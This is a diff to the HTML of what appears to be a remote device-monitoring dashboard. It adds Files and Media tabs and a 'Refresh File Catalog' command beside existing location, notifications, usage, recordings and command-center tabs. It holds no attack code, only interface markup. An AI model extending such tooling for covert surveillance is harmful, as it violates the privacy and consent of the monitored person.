@@ -220,6 +220,8 @@
           <button class="tab-btn active" data-tab="tab-overview">Overview</button>
           <button class="tab-btn" data-tab="tab-location">Location & Map</button>
           <button class="tab-btn" data-tab="tab-notifications">Notifications</button>
+          <button class="tab-btn" data-tab="tab-files">Files</button>
+          <button class="tab-btn" data-tab="tab-media">Media</button>
           <button class="tab-btn" data-tab="tab-apps">Applications</button>
           <button class="tab-btn" data-tab="tab-usage">Usage Analytics</button>
           <button class="tab-btn" data-tab="tab-commands">Command Center</button>
@@ -305,7 +307,59 @@
           </div>
         </div>
 
-        <!-- TAB 4: APPLICATIONS -->
+        <!-- TAB 4: FILES -->
+        <div id="tab-files" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header">
+              <h3>File Catalog</h3>
+              <div class="flex-row">
+                <input type="text" id="files-search-input" placeholder="Search files..." class="input-inline" />
+                <select id="files-type-filter" class="input-inline">
+                  <option value="all">All</option>
+                  <option value="downloads">Downloads</option>
+                  <option value="images">Images</option>
+                  <option value="videos">Videos</option>
+                </select>
+                <button id="btn-request-files" class="btn btn-secondary btn-sm">Refresh Catalog</button>
+              </div>
+            </div>
+            <div class="table-container">
+              <table class="data-table">
+                <thead>
+                  <tr>
+                    <th>Name</th>
+                    <th>Path</th>
+                    <th>Type</th>
+                    <th>Size</th>
+                    <th>Modified</th>
+                  </tr>
+                </thead>
+                <tbody id="files-table-body">
+                  <tr><td colspan="5" class="text-center">No file catalog available.</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 5: MEDIA -->
+        <div id="tab-media" class="tab-panel">
+          <div class="panel">
+            <div class="panel-header">
+              <h3>Media Library</h3>
+              <div class="flex-row">
+                <button class="btn btn-secondary btn-sm media-filter-btn" data-type="images">Photos</button>
+                <button class="btn btn-secondary btn-sm media-filter-btn" data-type="videos">Videos</button>
+                <button class="btn btn-secondary btn-sm media-filter-btn" data-type="all">All Media</button>
+              </div>
+            </div>
+            <div id="media-grid" class="media-grid">
+              <div class="empty-state">No media catalog available.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 6: APPLICATIONS -->
         <div id="tab-apps" class="tab-panel">
           <div class="panel">
             <div class="panel-header">
@@ -333,7 +387,7 @@
           </div>
         </div>
 
-        <!-- TAB 5: USAGE -->
+        <!-- TAB 7: USAGE -->
         <div id="tab-usage" class="tab-panel">
           <div class="panel">
             <div class="panel-header">
@@ -346,7 +400,7 @@
           </div>
         </div>
 
-        <!-- TAB 6: COMMANDS -->
+        <!-- TAB 8: COMMANDS -->
         <div id="tab-commands" class="tab-panel">
           <div class="panel">
             <div class="panel-header">
@@ -368,6 +422,10 @@
               <button class="cmd-tile" data-cmd="REQUEST_USAGE">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" x2="18" y1="20" y2="10"/><line x1="12" x2="12" y1="20" y2="4"/><line x1="6" x2="6" y1="20" y2="14"/></svg>
                 <span>Pull App Usage Stats</span>
+              </button>
+              <button class="cmd-tile" data-cmd="REQUEST_FILES">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6a2 2 0 0 1 2-2h5l2 2h7a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6z"/></svg>
+                <span>Refresh File Catalog</span>
               </button>
               <button class="cmd-tile" data-cmd="SEND_NOTIFICATION">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
@@ -407,7 +465,7 @@
           </div>
         </div>
 
-        <!-- TAB 7: RECORDINGS -->
+        <!-- TAB 9: RECORDINGS -->
         <div id="tab-recordings" class="tab-panel">
           <div class="panel">
             <div class="panel-header">
@@ -419,7 +477,7 @@
           </div>
         </div>
 
-        <!-- TAB 8: PERMISSIONS -->
+        <!-- TAB 10: PERMISSIONS -->
         <div id="tab-permissions" class="tab-panel">
           <div class="panel">
             <div class="panel-header">
